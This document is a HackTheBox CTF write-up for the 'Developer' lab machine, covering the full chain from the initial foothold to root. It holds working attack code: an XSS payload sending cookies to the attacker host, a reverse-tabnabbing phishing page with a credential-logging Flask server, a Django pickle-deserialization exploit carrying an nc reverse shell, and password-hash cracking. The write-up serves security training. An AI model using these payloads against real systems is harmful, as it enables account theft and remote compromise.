@@ -1,0 +1,412 @@
+                          Developer
+
+                          11th Jan 2022 / Document No D22.100.148
+                          Prepared By: TheCyberGeek
+                          Machine Author(s): TheCyberGeek
+                          Difficulty: Hard
+
+Classification: Official
+
+Synopsis
+
+Developer is a hard machine that outlines the severity of tabnabbing vulnerability in web applications where
+attackers can control the input of an input field with target="_blank" allowing attackers to open a new
+tab to access their malicious page and redirect the previous tab to an attacker controlled location if mixed
+with an XSS injection. This attack leads to fooling site users and administrators into entering their
+credentials into a phishing template of the original site's login. Subdomain enumeration via the
+administration panel in Django leads to abusing the debug mode in Sentry's monitoring application which
+reveals a secret key which can then be used to perform django de-serialization attacks through cookie
+deserialization. Privelege escalation involves reversing a Rust application which contains a hardcoded nonce,
+key and ciphertext which users can retieve and decoded through AES-CTR algorithm to gain the application's
+password to gain a system shell on the target.
+
+Skills Required
+
+      CTF player experience
+      Web skills including XSS skills
+      Basic Rust skill
+      Basic Cryptography skills
+      Understanding of Python Deserialization
+      Researching skills
+
+Skills Learned
+      Reverse Tabnabbing Vulnerability via XSS
+      Manual Application Testing
+      Python Django Deserialization
+      Django hash cracking
+      Rust Reversing
+      AES CTR Decryption
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.103 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV 10.10.11.103
+To begin the machine we start off with a port scan to identify the running services on the target.
+
+Tabnabbing
+
+Visiting port 80 we are redirected to developer.htb . So we add the /etc/hosts entry pointing to the
+domain.
+
+   echo '10.10.11.103 developer.htb' >> /etc/hosts
+When we visit developer.htb we see a landing page for advertising a CTF platform.
+We can see we can register an account for free, so we sign up to the platform. After registering an account
+we are redirected to the dashboard of the platform. We see we can access our profiles and edit the details
+there, or play some challenges. We take a look at the challenges (most are easy by design).
+
+We navigate to the challenge category we want to play and download the challenge zip files provided on
+site.
+After unzipping the zip file we extract the binary and check the file.
+
+We have a non-stripped file which means that function names will still be accessible through decompilers,
+testing to see what you can do we run the binary and enter our name.
+We start the binary in GDB and set a breakpoint on main, then disassemble the main function and see
+what's going on.
+
+We can see that when the binary is started we enter a function called play, so we disassemble this function.
+We see a winner function, so we set the $rip value to the winner address and continue the program since
+the RIP (Return Instruction Pointer) value contains the address of the next instruction to be executed and by
+continuing the program we jump directly to that address.
+
+   DHTB{gOInGWITHtHEfLOW}
+We take the flag and submit it on the developer CTF platform and after submitting on site we get a
+notification stating that we have successfully solved the challenge. If we refresh the page, the submit flag
+button changed to submit walkthrough. If we click on submit a walkthrough we see a disclaimer.
+What we understand from this disclaimer is that admins will review the writeups that are published on our
+profile pages periodically and delete them if they feel it's necessary. To verify that the admin is reading our
+writeups we add a writeup link pointing to our IP address http://10.10.14.21/writeup.html then start a
+Python3 HTTP server.
+
+   sudo python3 -m http.server 80
+Wait for a minute we see that our writeup has been accessed.
+
+At this stage we test for default XSS injections by adding the injection to a writeup.html file. Our
+writeup.html has the following contents.
+
+   <script>document.location="http://10.10.14.21/?cookie=" + document.cookie</script>
+Since we got a callback on our HTTP server with an empty cookie we confirm that we have identified a valid
+XSS injection but find that the standard type of cookie disclosure injections do not work because of the way
+Django handles cookies. To establish what the possibilities are with a admin reading our content we
+navigate to the profile page to check the source code where the writeup link is held.
+
+We can see a vulnerability exists where <a></a> HTML elements are specified with target="_blank"
+without applying the rel="noopener nofollow" as according to 0xprashant who discovered the bug on
+HackTheBox platform. The disclosure can be found here.
+The vulnerability chained with an XSS injection allows attackers to hijack the victims previous browser tab,
+since the attacker has full control over the <a> tag that users visit they can host a malicious web page with
+a writeup which pops up in a new window that has embedded JavaScript that can redirect the previous tab
+to an attacker controlled website. Typically this kind of attack leads to phishing attempts since victim'c can
+be convinced that they have been logged out of the website they were previously accessing. More
+information about reverse tabnabbing can be found here.
+Now we can set up an attack path to trick the admin into thinking he has been signed out of the platform
+and phish his password. To do this we set up a Flask web server and add 2 files. First our
+templates/writeup.html needs to be altered to redirect the previous tab after the writeup is clicked to
+our own cloned version of the platform login page called login.html .
+   <!doctype html>
+   <html>
+   Example Writeup
+   <script>
+   if (window.opener)
+   window.opener.parent.location.replace('http://10.10.14.21/accounts/login/');
+   if (window.parent != window)
+   window.parent.location.replace('http://10.10.14.21/accounts/login/');
+   </script>
+   </html>
+
+Clone the login page for the platform. To do this we can use wget .
+
+   wget http://developer.htb/accounts/login/ -O templates/login.html
+
+Create a basic Flask server that will host both the writeup.html and the login page.
+
+   from flask import Flask, request, render_template
+
+   app = Flask(__name__)
+
+   @app.route('/writeup.html', methods=['GET'])
+   def writeup():
+
+          return render_template('writeup.html')
+
+   @app.route('/accounts/login/', methods=['GET','POST'])
+   def login():
+
+          if request.method == "POST":
+                 username = request.form.get('login')
+                 password = request.form.get('password')
+                 print("Got username and password: {}:{}".format(username,password))
+                 return render_template('login.html')
+
+          else:
+                 return render_template('login.html')
+
+   app.run(host="10.10.14.21",port=80)
+
+After starting the web server and navigating to http://10.10.14.21/accounts/login/ we can see that
+there is no stylesheets applied which would make the administrator aware of a phishing attempt, so we
+change the login.html CSS and JS imports to point to developer.htb .
+
+   <!doctype html>
+   <html lang="en">
+
+      <head>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-
+
+   fit=no">
+          <meta name="description" content="">
+          <meta name="author" content="">
+          <link rel="icon" href="/img/favicon.ico">
+          <link rel="stylesheet" href="http://developer.htb/static/css/jquery.toasts.css">
+          <script src="http://developer.htb/static/js/all.min.js"></script>
+          <script src="http://developer.htb/static/js/jquery-3.2.1.min.js"></script>
+          <title>Login | Developer.HTB</title>
+
+          <!-- Bootstrap core CSS -->
+          <link rel="stylesheet" href="http://developer.htb/static/css/bootstrap.min.css">
+
+          <!-- Custom styles for this template -->
+          <link href="http://developer.htb/static/css/signin.css" rel="stylesheet">
+      </head>
+
+      <body class="text-center">
+
+          <form class="form-signin" action="/accounts/login/" method="post">
+              <input type="hidden" name="csrfmiddlewaretoken"
+
+   value="BqPwwpc0PqDLxWROeMA66cylLuFHpfannbUwq9BjIdFKUIEkX38RQfiDAvMin36f">
+              <img class="mb-4" src="http://developer.htb/static/img/logo.png" alt=""
+
+   width="72" height="72">
+              <h1 class="h3 mb-3 font-weight-normal">Welcome back!</h1>
+              <label for="uname" class="sr-only">User Name</label>
+              <input type="text" id="id_login" name="login" placeholder="Username" class="form-
+
+   control" required autofocus>
+              <label for="password" class="sr-only">Password</label>
+              <input type="password" id="id_password" name="password" placeholder="Password"
+
+   class="form-control" required>
+
+              <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign
+   in</button>
+
+                     <a href="/accounts/password/reset/" class="auth-link">Forgot password?</a>
+          <div class="text-center mt-4 font-weight-light"> Don't have an account? <a
+   href="/accounts/signup/" >Click here!</a>
+
+              <p class="mt-5 mb-3 text-muted">&copy; Developer.HTB 2021</p>
+          </form>
+
+   <script src="http://developer.htb/static/js/jquery.toast.js"></script>
+   <script>
+
+   </script>
+      </body>
+
+   </html>
+
+Start the Flask server and check our local login page before attempting the attack.
+   python3 server.py
+
+Since the CSS looks identical to the website, we check if the POST request works by submitting a random
+username and password and checking the Flask server's output.
+
+We successfully obtained the fake username and password locally, now we launch the attack. We submit
+our writeup link of http://10.10.14.21/writeup.html and wait for the admin to read out writeup. Once
+the admin goes to read our writeup, he is redirected to our fake login page and thinks that he has been
+logged out of the platform, then re-enters his credentials to log back into the platform.
+We have the password SuperSecurePassword@HTB2021 , which we can try to authenticate to the admin
+account with. Log out and try to authenticate as the administrator.
+
+We successfully authenticated as the admin user, we should look for the backend of the website to see what
+information we can find within the site such as potential usernames, email addresses and virtual hosts. By
+default Django has an administration panel at /admin of the website. By visiting /admin we are logged into
+the administration panel.
+We see we are authenticated as jacob , checking the Users section we select the admin user and see that
+we have a name for the admin to confirm it's jacob .
+
+Selecting the Sites option we see there is a second domain attached to the site.
+
+Add the entry to our /etc/hosts file.
+   sed -i 's/developer.htb/developer.htb developer-sentry.developer.htb/g' /etc/hosts
+
+Sentry Python Pickle Deserialization
+
+Visiting the URL we are presented with a Sentry login portal. Sentry is well known web application that
+manages web application errors with an easy to use interface.
+We try to authenticate as admin or admin@developer.htb with the password
+SuperSecurePassword@HTB2021 , but this is unsuccessful with those credentials. Referring back to the
+admin's name we try jacob@developer.htb and we can successfully authenticate.
+
+Manually investigating the features of the website we come across a debug page when creating a project
+then trying to delete the project through the project settings.
+Scrolling down in the debug output we can see that a secret key for the Django application has been left
+exposed as well as indicating which serialization mechanism is used for signing cookies!
+
+By performing a Google search with the key words of Sentry RCE we find this vulnerability disclosure. We
+can take advantage of this, by performing a Python Pickle deserialization attack which was previously
+performed on Facebook's own Sentry server. Using the code extract provided from the diclosure, we are
+able to change the script, adding our newly found secret key of c7f3a64aa184b7cbb1a7cbe9cd544913 , the
+cookie assigned to us currently by Sentry to leverage in the attack, and finally the command we wish to
+execute on the server.
+
+   #!/usr/bin/python
+   import django.core.signing, django.contrib.sessions.serializers
+   from django.http import HttpResponse
+   import cPickle
+   import os
+
+   SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
+   #Initial cookie I had on sentry when trying to reset a password
+   cookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQq5uvibZBR4FRrllxhFcA
+   EFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM
+   3McgSwniJpSPQDLwjOi:1lkrWo:2657X8ISgcu3kQuI4UsMDg1XtrM'
+   newContent =
+
+     django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.ser
+   ializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
+   class PickleRce(object):
+
+          def __reduce__(self):
+                 return (os.system,("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
+
+   10.10.14.21 4444 >/tmp/f",))
+   newContent['testcookie'] = PickleRce()
+
+   print
+   django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.
+   serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',com
+   press=True
+
+We install Django on Python2.7 as the website debug page shows that it's using Python2.7.
+
+   pip install django
+After running the python script, we are presented with a cookie.
+
+We start a local netcat listener on port 4444 and apply our generated cookie to the sentryid cookie
+wraped in double quotes to the website.
+
+Once we refresh the page we successfully spawn a shell on the target as www-data user.
+
+Lateral Movement
+
+We know that Sentry has a database to authenticate users, but we need to find the credentials for it. By
+performing a Google search for Sentry Django Database Configuration we find information that points
+to /etc/sentry/sentry.conf.py so we read the file and see that the username is sentry and the
+password is SentryPassword2021 to the sentry database.
+Since we know that the backend is Django and that database is postgresql which was identified in the
+debug page of Sentry, we can extract the credentials from the database using this link but with slightly
+altered syntax since we are not dealing with manage.py which manages the Django application and has
+built in features to interact with the database.
+
+   psql -h localhost -d sentry -U sentry -W -c "select username, password from auth_user
+   where is_staff;"
+We know the password for jacob already and he is not a user on the system, but karl is a user on the
+system.
+
+   cat /etc/passwd | grep /bin/bash
+
+We extract his password hash of PBKDF2-SHA256 format and then crack the hash following the previous
+blog post for Django hashes using hashcat . Although PBKDF2-SHA256 is designed to be slow in
+computation, it is still worth to see if the user used a leaked password using rockyou.txt .
+
+   hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt --force
+Now that we have cracked the password we try to SSH as karl and we are successfully authenticated. The
+user flag can be found in /home/karl/ .
+
+Privilege Escalation
+
+Rust Reversing
+
+Performing basic enumeration checks we check the sudo -l entries and see an entry that allows us to
+execute an authentication binary as the root user.
+When we execute the binary we can see that it prompts us for a password.
+
+We transfer the binary back to our localhost with scp .
+   scp -P 2222 /root/.auth/authenticator tcg@10.10.14.21:/home/tcg/htb/developer/
+
+With the binary on our local machine, we need to analyze it.
+Checking the file type we can see that the binary is a 64-bit non-stripped elf so we can pull the function
+names from the binary. Running the binary in Ghidra we begin to analyze the process of the main function.
+Navigate to the Symbol Tree section and select Namespaces -> a -> authentication -> main to
+decompile the main function.
+
+The decompilation shows that the application is using AES-CTR for encryptions.
+   msg = (&str)crypto::aes::ctr(0x20,0,&local_118,0x10,&local_108,0x10)
+
+By performing a Google search for crypto::aes::ctr , we discover the Rust documentation for the AES-
+CTR cipher.
+
+   pub fn ctr(
+          key_size: KeySize,
+          key: &[u8],
+          iv: &[u8]
+
+   ) -> Box<SynchronousStreamCipher + 'static>
+Using this information we can translate the decompiled crypto::aes::ctr element. This shows that we
+have a key of 16 bytes, and IV of 16 bytes and together the key size is 32 bytes.
+
+   msg = (&str)crypto::aes::ctr(32,0,KEY,16,IV,16)
+Right click on the elements and select Rename Variable to set them to a human readable format. After
+renaming the variables we can see that the key and IV are defined above.
+
+By double clicking on the memory address of the key and IV seperately by navigating to Listing window
+and double clicking on DAT_0014a030 and DATA_0014a040 we are taken to the exact memory locations of
+the data.
+
+Highlight the key and IV sections seperately, then right click them and selecting Copy Special -> Byte
+String (No Spaces) to copy the values to clipboard.
+
+   KEY = a3e832345c7991619e20d43dbef4f5d5
+   IV = 761f59e3d9d2959aa79855dc062081
+Analyzing the decompiled function we see that there is a section where a SynchronousStreamCipher is
+called. Just below that there is a comparison being made which helps us identify the user input.
+The statement shows that if the encrypted user input length is not 32 characters long and the encrypted
+user input does not match _ptr variable then the binary jumps from LAB_001079e9 to display the
+message You entered the wrong password but if the 32 byte encrypted data matches the _ptr variable
+then the binary jumps from LAB_00107a37 to display the message You have successfully
+autneticated . We can assume that the SynchronousStreamCipher is taking the user input and the user
+input length, encrypting it then comparing against encrypted data stored in the _ptr variable. Rename the
+_ptr variable to ENCRYPTED_DATA and find it in the decompiled code.
+
+Click on DAT_0014a000 in the Listing window and go the memory location where the encrypted data
+starts then highlight both DAT_0014a000 and DAT_0014a010 then right click and select Copy Special ->
+Byte String (No Spaces) to copy the encrypted data to clipboard.
+
+   KEY = a3e832345c7991619e20d43dbef4f5d5
+   IV = 761f59e3d9d2959aa79855dc062081
+   CT = fe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c
+
+We can build a decryption mechanism for the AES-CTR that takes a base64 key, nonce and ciphertext to
+decode the message. Using an example from this link we can decode the ciphertext and extract the
+hardcoded password from the Rust application.
+
+   #!/usr/bin/python3
+   import base64
+   from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+   from cryptography.hazmat.backends import default_backend
+   from binascii import unhexlify, b2a_base64
+   hex_to_b64_key = b2a_base64(bytes.fromhex('a3e832345c7991619e20d43dbef4f5d5'))
+   hex_to_b64_nonce = b2a_base64(bytes.fromhex('761f59e3d9d2959aa79855dc0620816a'))
+   hex_to_b64_ct =
+   b2a_base64(bytes.fromhex('fe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f271
+   52c'))
+   key = base64.decodebytes(hex_to_b64_key)
+   nonce = base64.decodebytes(hex_to_b64_nonce)
+   ct = base64.decodebytes(hex_to_b64_ct)
+   backend = default_backend()
+   cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=backend)
+   decryptor = cipher.decryptor()
+   print(decryptor.update(ct) + decryptor.finalize())
+When we run the above solver script, the password for the application is successfully retrieved.
+
+Now with the password, we can authenticate to the application and gain a prompt to add our SSH public
+key.
+
+After adding our id_rsa.pub into the application, we are able to gain a SSH session as root.
+The root flag can be found in /root .
+
